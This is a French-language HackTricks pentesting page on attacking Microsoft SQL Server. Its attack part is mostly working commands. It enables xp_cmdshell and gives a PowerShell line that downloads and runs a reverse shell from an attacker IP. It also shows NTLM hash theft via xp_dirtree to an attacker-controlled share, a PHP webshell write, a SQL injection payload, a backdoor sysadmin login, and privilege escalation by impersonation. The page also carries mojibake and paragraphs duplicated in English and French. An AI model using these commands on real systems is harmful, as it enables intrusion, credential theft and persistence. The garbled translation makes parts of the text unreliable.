# 1433 - Pentesting MSSQL - Microsoft SQL Server

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? Ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof est la plateforme des primes de bugs cryptographiques.**

**Obtenez des r√©compenses sans d√©lai**\
Les primes HackenProof ne sont lanc√©es que lorsque les clients d√©posent le budget de r√©compense. Vous recevrez la r√©compense apr√®s la v√©rification du bug.

**Acqu√©rez de l'exp√©rience en pentesting web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Ma√Ætrisez la s√©curit√© web3 d√®s ses d√©buts.

**Devenez la l√©gende du hacker web3**\
Gagnez des points de r√©putation avec chaque bug v√©rifi√© et conqu√©rez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) commencez √† gagner gr√¢ce √† vos piratages !

{% embed url="https://hackenproof.com/register" %}

## Informations de base

**Microsoft SQL Server** est un **syst√®me de gestion de base de donn√©es relationnelle** d√©velopp√© par Microsoft. En tant que serveur de base de donn√©es, c'est un produit logiciel dont la fonction principale est de stocker et de r√©cup√©rer des donn√©es telles que demand√©es par d'autres applications logicielles - qui peuvent s'ex√©cuter soit sur le m√™me ordinateur, soit sur un autre ordinateur via un r√©seau (y compris Internet).\
Depuis [wikipedia](https://en.wikipedia.org/wiki/Microsoft\_SQL\_Server).

**Port par d√©faut :** 1433
```
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
```
### **Tables syst√®me par d√©faut de MS-SQL**

* **Base de donn√©es master** : Enregistre toutes les informations de niveau syst√®me pour une instance de SQL Server.
* **Base de donn√©es msdb** : Est utilis√©e par SQL Server Agent pour planifier des alertes et des t√¢ches.
* **Base de donn√©es model** : Est utilis√©e comme mod√®le pour toutes les bases de donn√©es cr√©√©es sur l'instance de SQL Server. Les modifications apport√©es √† la base de donn√©es mod√®le, telles que la taille de la base de donn√©es, la collation, le mod√®le de r√©cup√©ration et d'autres options de base de donn√©es, sont appliqu√©es √† toutes les bases de donn√©es cr√©√©es ult√©rieurement.
* **Base de donn√©es Resource** : Est une base de donn√©es en lecture seule qui contient des objets syst√®me inclus avec SQL Server. Les objets syst√®me sont physiquement stock√©s dans la base de donn√©es Resource, mais ils apparaissent logiquement dans le sch√©ma sys de chaque base de donn√©es.
* **Base de donn√©es tempdb** : Est un espace de travail pour stocker des objets temporaires ou des ensembles de r√©sultats interm√©diaires.

## √ânum√©ration

### √ânum√©ration automatique

Si vous ne connaissez rien sur le service :
```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
msf> use auxiliary/scanner/mssql/mssql_ping
```
{% hint style="info" %}
Si vous **n'avez pas** **d'identifiants**, vous pouvez essayer de les deviner. Vous pouvez utiliser nmap ou metasploit. Faites attention, vous pouvez **bloquer des comptes** si vous √©chouez √† vous connecter plusieurs fois en utilisant un nom d'utilisateur existant.
{% endhint %}

#### Metasploit (n√©cessite des identifiants)
```bash
#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass
```
### [**Brute force**](../../generic-methodologies-and-resources/brute-force.md#sql-server)

### √ânum√©ration manuelle

#### Connexion
```bash
# Using Impacket mssqlclient.py
mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>

# Using sqsh
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
## In case Windows Auth using "." as domain name for local user
sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database>
## In sqsh you need to use GO after writting the query to send it
1> select 1;
2> go
```
#### √ânum√©ration courante

When conducting a penetration test against a Microsoft SQL Server (MSSQL) database, it is important to perform thorough enumeration to gather information about the database and its configuration. This information can be used to identify potential vulnerabilities and weaknesses that can be exploited during the testing process.

Lors de la r√©alisation d'un test de p√©n√©tration sur une base de donn√©es Microsoft SQL Server (MSSQL), il est important d'effectuer une √©num√©ration approfondie afin de recueillir des informations sur la base de donn√©es et sa configuration. Ces informations peuvent √™tre utilis√©es pour identifier d'√©ventuelles vuln√©rabilit√©s et faiblesses qui peuvent √™tre exploit√©es lors du processus de test.

The following are some common enumeration techniques that can be used during MSSQL database pentesting:

Voici quelques techniques courantes d'√©num√©ration qui peuvent √™tre utilis√©es lors du pentest d'une base de donn√©es MSSQL :

1. **Banner Grabbing**: This technique involves connecting to the MSSQL server and capturing the banner information, which typically includes the server version and other details. This information can be useful in identifying the specific version of MSSQL being used.

1. **Capture de banni√®re** : Cette technique consiste √† se connecter au serveur MSSQL et √† capturer les informations de la banni√®re, qui incluent g√©n√©ralement la version du serveur et d'autres d√©tails. Ces informations peuvent √™tre utiles pour identifier la version sp√©cifique de MSSQL utilis√©e.

2. **Port Scanning**: By scanning the target system for open ports, you can identify if the MSSQL server is running on a specific port, such as the default port 1433. This can help in determining the accessibility of the server.

2. **Scan de ports** : En scannant le syst√®me cible pour trouver les ports ouverts, vous pouvez identifier si le serveur MSSQL fonctionne sur un port sp√©cifique, comme le port par d√©faut 1433. Cela peut aider √† d√©terminer l'accessibilit√© du serveur.

3. **Service Enumeration**: Once the MSSQL server is identified, it is important to enumerate the services running on the server. This can be done using tools like Nmap or manually by querying the server for available services.

3. **√ânum√©ration des services** : Une fois que le serveur MSSQL est identifi√©, il est important d'√©num√©rer les services en cours d'ex√©cution sur le serveur. Cela peut √™tre fait √† l'aide d'outils tels que Nmap ou manuellement en interrogeant le serveur pour conna√Ætre les services disponibles.

4. **User Enumeration**: Enumerating the users present in the MSSQL database can provide valuable information for further exploitation. This can be done by querying the server for user accounts or by using tools like Metasploit.

4. **√ânum√©ration des utilisateurs** : L'√©num√©ration des utilisateurs pr√©sents dans la base de donn√©es MSSQL peut fournir des informations pr√©cieuses pour une exploitation ult√©rieure. Cela peut √™tre fait en interrogeant le serveur pour obtenir des comptes d'utilisateurs ou en utilisant des outils tels que Metasploit.

5. **Database Enumeration**: Enumerating the databases present on the MSSQL server can help in identifying potential targets for further exploitation. This can be done by querying the server for available databases or by using tools like SQLMap.

5. **√ânum√©ration des bases de donn√©es** : L'√©num√©ration des bases de donn√©es pr√©sentes sur le serveur MSSQL peut aider √† identifier des cibles potentielles pour une exploitation ult√©rieure. Cela peut √™tre fait en interrogeant le serveur pour conna√Ætre les bases de donn√©es disponibles ou en utilisant des outils tels que SQLMap.

By performing these common enumeration techniques, you can gather valuable information about the MSSQL database and its configuration, which can aid in identifying potential vulnerabilities and weaknesses for exploitation during the penetration testing process.

En effectuant ces techniques courantes d'√©num√©ration, vous pouvez recueillir des informations pr√©cieuses sur la base de donn√©es MSSQL et sa configuration, ce qui peut aider √† identifier d'√©ventuelles vuln√©rabilit√©s et faiblesses √† exploiter lors du processus de test de p√©n√©tration.
```sql
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

#Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
```
#### Obtenir l'utilisateur

{% content-ref url="types-of-mssql-users.md" %}
[types-of-mssql-users.md](types-of-mssql-users.md)
{% endcontent-ref %}
```sql
# Get all the users and roles
select * from sys.database_principals;
## This query filters a bit the results
select name,
create_date,
modify_date,
type_desc as type,
authentication_type_desc as authentication_type,
sid
from sys.database_principals
where type not in ('A', 'R')
order by name;

## Both of these select all the users of the current database (not the server).
## Interesting when you cannot acces the table sys.database_principals
EXEC sp_helpuser
SELECT * FROM sysusers
```
#### Obtenir les autorisations

Quelques termes d'introduction sur MSSQL :

1. **Securable :** Ce sont les ressources auxquelles le syst√®me d'autorisation du moteur de base de donn√©es SQL Server contr√¥le l'acc√®s. Il existe trois cat√©gories plus larges sous lesquelles un securable peut √™tre diff√©renci√© :
* Serveur - Par exemple, les bases de donn√©es, les connexions, les points de terminaison, les groupes de disponibilit√© et les r√¥les serveur
* Base de donn√©es - Par exemple, le r√¥le de base de donn√©es, les r√¥les d'application, le sch√©ma, le certificat, le catalogue de texte int√©gral, l'utilisateur
* Sch√©ma - Par exemple, table, vue, proc√©dure, fonction, synonyme
2. **Autorisation :** Chaque securable de SQL Server a des autorisations associ√©es telles que ALTER, CONTROL, CREATE qui peuvent √™tre accord√©es √† un principal. Les autorisations sont g√©r√©es au niveau du serveur √† l'aide des connexions et au niveau de la base de donn√©es √† l'aide des utilisateurs.
3. **Principal :** L'entit√© qui re√ßoit une autorisation sur un securable est appel√©e un principal. Les principaux les plus courants sont les connexions et les utilisateurs de base de donn√©es. L'acc√®s √† un securable est contr√¥l√© en accordant ou en refusant des autorisations ou en ajoutant des connexions et des utilisateurs √† des r√¥les qui ont acc√®s.
```sql
# Show all different securables names
SELECT distinct class_desc FROM sys.fn_builtin_permissions(DEFAULT);
# Show all possible permissions in MSSQL
SELECT * FROM sys.fn_builtin_permissions(DEFAULT);
# Get all my permissions over securable type SERVER
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
# Get all my permissions over a database
USE <database>
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
# Get members of the role "sysadmin"
Use master
EXEC sp_helpsrvrolemember 'sysadmin';
# Get if the current user is sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
# Get users that can run xp_cmdshell
Use master
EXEC sp_helprotect 'xp_cmdshell'
```
## Astuces

### Ex√©cuter des commandes syst√®me

{% hint style="danger" %}
Notez que pour pouvoir ex√©cuter des commandes syst√®me, il est non seulement n√©cessaire d'avoir **`xp_cmdshell`** **activ√©**, mais aussi d'avoir l'autorisation **EXECUTE sur la proc√©dure stock√©e `xp_cmdshell`**. Vous pouvez v√©rifier qui (√† l'exception des sysadmins) peut utiliser **`xp_cmdshell`** avec:
```sql
Use master
EXEC sp_helprotect 'xp_cmdshell'
```
{% endhint %}
```bash
# Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'

# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

#One liner
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
# Get Rev shell
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'

# Bypass blackisted "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' ‚Äî
```
### Voler le hachage NetNTLM / Attaque de relais

Vous devez d√©marrer un **serveur SMB** pour capturer le hachage utilis√© dans l'authentification (`impacket-smbserver` ou `responder` par exemple).
```bash
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
EXEC master..xp_fileexist '\\<attacker_IP>\anything\'

# Capture hash
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
```
{% hint style="warning" %}
Vous pouvez v√©rifier si quelqu'un (√† part les administrateurs syst√®me) a les autorisations pour ex√©cuter ces fonctions MSSQL avec :
```sql
Use master;
EXEC sp_helprotect 'xp_dirtree';
EXEC sp_helprotect 'xp_subdirs';
EXEC sp_helprotect 'xp_fileexist';
```
{% endhint %}

En utilisant des outils tels que **responder** ou **Inveigh**, il est possible de **voler le hachage NetNTLM**.\
Vous pouvez voir comment utiliser ces outils dans:

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

### Abus des liens de confiance MSSQL

[**Lisez cet article**](../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md) **pour trouver plus d'informations sur la fa√ßon d'exploiter cette fonctionnalit√©:**

{% content-ref url="../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md" %}
[abusing-ad-mssql.md](../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md)
{% endcontent-ref %}

### **√âcrire des fichiers**

Pour √©crire des fichiers en utilisant `MSSQL`, nous **devons activer** [**les proc√©dures d'automatisation Ole**](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), ce qui n√©cessite des privil√®ges d'administrateur, puis ex√©cuter certaines proc√©dures stock√©es pour cr√©er le fichier:
```bash
# Enable Ole Automation Procedures
sp_configure 'show advanced options', 1
RECONFIGURE

sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

# Create a File
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```
### **Lire un fichier avec** OPENROWSET

Par d√©faut, `MSSQL` permet la **lecture de fichiers sur n'importe quel fichier du syst√®me d'exploitation auquel le compte a acc√®s en lecture**. Nous pouvons utiliser la requ√™te SQL suivante :
```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```
Cependant, l'option **`BULK`** n√©cessite l'autorisation **`ADMINISTER BULK OPERATIONS`** ou l'autorisation **`ADMINISTER DATABASE BULK OPERATIONS`**.
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS' OR permission_name='ADMINISTER DATABASE BULK OPERATIONS';
```
#### Vecteur bas√© sur les erreurs pour les injections SQL :

This technique involves exploiting SQL injection vulnerabilities by manipulating the input in a way that triggers an error response from the Microsoft SQL Server. By carefully crafting the input, an attacker can extract valuable information from the error message, such as the structure of the database or the version of the SQL Server being used. This information can then be used to further exploit the system and gain unauthorized access.

To perform an error-based SQL injection attack, the attacker needs to identify a vulnerable input field that is not properly sanitized or validated by the application. Once a vulnerable input is found, the attacker can inject malicious SQL code that will cause an error when executed by the SQL Server.

The error message returned by the SQL Server can provide valuable insights into the underlying database structure. For example, if the error message includes a table or column name, it can indicate the presence of certain database objects. Additionally, the error message may reveal the version of the SQL Server, which can help the attacker in selecting the appropriate attack techniques.

To mitigate the risk of error-based SQL injection attacks, it is important to implement proper input validation and sanitization techniques. This includes using parameterized queries or prepared statements, as well as input validation routines to ensure that user-supplied data is properly sanitized before being used in SQL queries. Regular security assessments and penetration testing can also help identify and remediate any vulnerabilities in the application.
```
https://vuln.app/getItem?id=1+and+1=(select+x+from+OpenRowset(BULK+'C:\Windows\win.ini',SINGLE_CLOB)+R(x))--
```
### **RCE/Lecture de fichiers ex√©cutant des scripts (Python et R)**

MSSQL peut vous permettre d'ex√©cuter des **scripts en Python et/ou R**. Ces codes seront ex√©cut√©s par un **utilisateur diff√©rent** de celui utilisant **xp\_cmdshell** pour ex√©cuter des commandes.

Exemple de tentative d'ex√©cution d'un **'R'** _"Hellow World!"_ **qui ne fonctionne pas** :

![](<../../.gitbook/assets/image (185) (1).png>)

Exemple utilisant Python configur√© pour effectuer plusieurs actions :
```sql
# Print the user being used (and execute commands)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
#Open and read a file
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
#Multiline
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO
```
### Lire le Registre

Microsoft SQL Server fournit **plusieurs proc√©dures √©tendues** qui vous permettent d'interagir non seulement avec le r√©seau, mais aussi avec le syst√®me de fichiers et m√™me le [**Registre Windows**](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)**:**

| **R√©gulier**                  | **Instance-Aware**                     |
| ---------------------------- | -------------------------------------- |
| sys.xp\_regread              | sys.xp\_instance\_regread              |
| sys.xp\_regenumvalues        | sys.xp\_instance\_regenumvalues        |
| sys.xp\_regenumkeys          | sys.xp\_instance\_regenumkeys          |
| sys.xp\_regwrite             | sys.xp\_instance\_regwrite             |
| sys.xp\_regdeletevalue       | sys.xp\_instance\_regdeletevalue       |
| sys.xp\_regdeletekey         | sys.xp\_instance\_regdeletekey         |
| sys.xp\_regaddmultistring    | sys.xp\_instance\_regaddmultistring    |
| sys.xp\_regremovemultistring | sys.xp\_instance\_regremovemultistring |
```sql
# Example read registry
EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Microsoft SQL Server\MSSQL12.SQL2014\SQLServerAgent', 'WorkingDirectory';
# Example write and then read registry
EXECUTE master.sys.xp_instance_regwrite 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue', 'REG_SZ', 'Now you see me!';
EXECUTE master.sys.xp_instance_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue';
# Example to check who can use these functions
Use master;
EXEC sp_helprotect 'xp_regread';
EXEC sp_helprotect 'xp_regwrite';
```
Pour **plus d'exemples**, consultez la [**source originale**](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/).

### RCE avec une fonction d√©finie par l'utilisateur MSSQL - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

Il est possible de **charger un fichier .NET dans MSSQL avec des fonctions personnalis√©es**. Cependant, cela **n√©cessite un acc√®s `dbo`**, vous avez donc besoin d'une connexion avec la base de donn√©es **en tant que `sa` ou un r√¥le d'administrateur**.

[**Suivez ce lien**](../../pentesting-web/sql-injection/mssql-injection.md#mssql-user-defined-function-sqlhttp) pour voir un exemple.

### Autres m√©thodes pour RCE

Il existe d'autres m√©thodes pour ex√©cuter des commandes, telles que l'ajout de [proc√©dures √©tendues](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [assemblages CLR](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [jobs de l'agent SQL Server](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15) et [scripts externes](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql).

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof est la plateforme des primes pour les bugs de cryptographie.**

**Obtenez des r√©compenses sans d√©lai**\
Les primes HackenProof sont lanc√©es uniquement lorsque leurs clients d√©posent le budget de r√©compense. Vous recevrez la r√©compense apr√®s la v√©rification du bug.

**Acqu√©rez de l'exp√©rience en pentesting web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Ma√Ætrisez la s√©curit√© web3 √† ses d√©buts.

**Devenez une l√©gende du hacking web3**\
Gagnez des points de r√©putation avec chaque bug v√©rifi√© et conqu√©rez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) et commencez √† gagner gr√¢ce √† vos hacks !

{% embed url="https://hackenproof.com/register" %}

## √âl√©vation de privil√®ges MSSQL

### De db\_owner √† sysadmin

Si un **utilisateur r√©gulier** se voit attribuer le r√¥le **`db_owner`** sur la **base de donn√©es appartenant √† un utilisateur administrateur** (comme **`sa`**) et que cette base de donn√©es est configur√©e comme **`trustworthy`**, cet utilisateur peut abuser de ces privil√®ges pour **√©lever ses privil√®ges** car des **proc√©dures stock√©es** cr√©√©es dans cette base de donn√©es peuvent s'ex√©cuter en tant que propri√©taire (**administrateur**).
```sql
# Get owners of databases
SELECT suser_sname(owner_sid) FROM sys.databases

# Find trustworthy databases
SELECT a.name,b.is_trustworthy_on
FROM master..sysdatabases as a
INNER JOIN sys.databases as b
ON a.name=b.name;

# Get roles over the selected database (look for your username as db_owner)
USE <trustworthy_db>
SELECT rp.name as database_role, mp.name as database_user
from sys.database_role_members drm
join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)

# If you found you are db_owner of a trustworthy database, you can privesc:
--1. Create a stored procedure to add your user to sysadmin role
USE <trustworthy_db>

CREATE PROCEDURE sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'USERNAME','sysadmin'

--2. Execute stored procedure to get sysadmin role
USE <trustworthy_db>
EXEC sp_elevate_me

--3. Verify your user is a sysadmin
SELECT is_srvrolemember('sysadmin')
```
Vous pouvez utiliser un module **metasploit** :
```bash
msf> use auxiliary/admin/mssql/mssql_escalate_dbowner
```
Ou un script **PS** :
```powershell
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1
Import-Module .Invoke-SqlServerDbElevateDbOwner.psm1
Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance 10.2.2.184
```
### Impersonation d'autres utilisateurs

SQL Server dispose d'une permission sp√©ciale, appel√©e **`IMPERSONATE`**, qui **permet √† l'utilisateur en cours d'ex√©cution de prendre les permissions d'un autre utilisateur** ou de se connecter jusqu'√† ce que le contexte soit r√©initialis√© ou que la session se termine.
```sql
# Find users you can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
# Check if the user "sa" or any other high privileged user is mentioned

# Impersonate sa user
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```
{% hint style="info" %}
Si vous pouvez vous faire passer pour un utilisateur, m√™me s'il n'est pas sysadmin, vous devriez v√©rifier **si l'utilisateur a acc√®s** √† d'autres **bases de donn√©es** ou serveurs li√©s.
{% endhint %}

Notez que une fois que vous √™tes sysadmin, vous pouvez vous faire passer pour n'importe quel autre utilisateur :
```sql
-- Impersonate RegUser
EXECUTE AS LOGIN = 'RegUser'
-- Verify you are now running as the the MyUser4 login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
-- Change back to sa
REVERT
```
Vous pouvez effectuer cette attaque avec un module **metasploit** :
```bash
msf> auxiliary/admin/mssql/mssql_escalate_execute_as
```
ou avec un script **PS** :
```powershell
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1
Import-Module .Invoke-SqlServer-Escalate-ExecuteAs.psm1
Invoke-SqlServer-Escalate-ExecuteAs -SqlServerInstance 10.2.9.101 -SqlUser myuser1 -SqlPass MyPassword!
```
## Utilisation de MSSQL pour la persistance

[https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/](https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/)

## √âl√©vation de privil√®ges locaux

L'utilisateur ex√©cutant le serveur MSSQL aura activ√© le jeton de privil√®ge **SeImpersonatePrivilege.**\
Vous pourrez probablement **√©lever les privil√®ges vers Administrateur** en suivant l'une de ces 2 pages :

{% content-ref url="../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/windows-local-privilege-escalation/juicypotato.md" %}
[juicypotato.md](../../windows-hardening/windows-local-privilege-escalation/juicypotato.md)
{% endcontent-ref %}

## Shodan

* `port:1433 !HTTP`

## R√©f√©rences

* [https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users](https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users)
* [https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/](https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/)
* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/)
* [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/)
* [https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/](https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/)
* [https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)

‚Äã

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof est la plateforme des primes pour les bugs de cryptographie.**

**Obtenez des r√©compenses sans d√©lai**\
Les primes HackenProof sont lanc√©es uniquement lorsque leurs clients d√©posent le budget de r√©compense. Vous recevrez la r√©compense apr√®s la v√©rification du bug.

**Acqu√©rez de l'exp√©rience en pentesting web3**\
